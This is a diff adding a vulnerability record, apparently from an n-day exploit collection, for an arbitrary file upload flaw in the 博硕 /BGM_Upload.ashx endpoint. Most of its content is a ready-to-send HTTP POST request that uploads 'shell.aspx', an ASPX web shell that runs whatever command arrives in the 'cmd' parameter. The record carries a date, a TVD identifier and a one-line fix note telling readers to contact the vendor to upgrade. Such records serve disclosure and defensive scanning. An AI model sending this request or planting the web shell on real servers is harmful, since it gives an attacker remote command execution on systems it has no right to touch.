@@ -1,0 +1,16 @@
+vendor = "博硕"
+name = "博硕 BGM_Upload.ashx 任意文件上传漏洞"
+type = "任意文件上传"
+path = "/BGM_Upload.ashx"
+version = ""
+detail = """POST /BGM_Upload.ashx HTTP/1.1 Host: target Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="shell.aspx"
+<%@Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd());%>
+------Boundary--"""
+fix = "联系厂商升级"
+date = 20260301
+label = "nday"
+cve = "TVD-2026-04901"
+verifier = "AdySec"
